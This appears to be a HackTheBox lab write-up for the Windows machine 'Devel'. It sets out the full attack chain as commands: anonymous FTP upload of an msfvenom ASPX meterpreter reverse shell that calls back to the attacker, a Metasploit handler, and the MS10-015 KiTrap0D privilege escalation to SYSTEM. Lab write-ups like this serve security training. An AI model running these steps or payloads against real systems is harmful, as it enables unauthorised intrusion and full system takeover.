# Devel

**Platform:** HackTheBox  
**OS:** Windows  
**Difficulty:** Easy  
**Date:** April 2026

---

## Summary

Windows machine running FTP with anonymous access and a web server 
sharing the same root directory. Uploading an ASPX reverse shell via 
FTP and triggering it through the web server grants initial access. 
Privilege escalation achieved via MS10-015 KiTrap0D exploit leading 
to SYSTEM.

---

## 1. Reconnaissance

Port scan using nmap:

```bash
nmap -Pn -sCV -p- --top-ports 1000 -T3 10.129.19.110
```

**Open ports:**

| Port | Service |
|------|---------|
| 21 | Microsoft FTPd |
| 80 | HTTP IIS |

---

## 2. FTP Anonymous Access

Connected to FTP anonymously:

```bash
ftp 10.129.19.110
# Name: Anonymous
# Password: (blank)
```

Confirmed web server and FTP share the same directory by uploading 
a test HTML file:

```bash
put test.html
```

Accessed via browser at `http://10.129.19.110/test.html` — confirmed.

---

## 3. Reverse Shell Upload

Generated ASPX reverse shell with msfvenom:

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
LHOST=10.10.15.207 LPORT=4444 -f aspx -o shell.aspx
```

Uploaded shell via FTP:

```bash
put shell.aspx
```

Set up Metasploit handler:

```bash
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST tun0
exploit
```

Triggered shell by navigating to:
http://10.129.19.110/shell.aspx

Received Meterpreter session as **web** user.

---

## 4. Privilege Escalation

Ran local exploit suggester:

```bash
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

Used MS10-015 KiTrap0D exploit:

```bash
use exploit/windows/local/ms10_015_kitrap0d
set SESSION 1
run
```

Received shell as **NT AUTHORITY\SYSTEM**.

---

## 5. Flags

Retrieved both flags:

```bash
shell
type C:\Users\babis\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

- user.txt ✅
- root.txt ✅

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port and service enumeration |
| msfvenom | ASPX reverse shell generation |
| Metasploit | Handler and privilege escalation |

---

## Vulnerabilities Found

| Vulnerability | Description |
|--------------|-------------|
| Anonymous FTP | Shell uploaded without authentication |
| FTP/Web shared root | Uploaded files executable via web |
| MS10-015 KiTrap0D | Windows kernel privilege escalation |
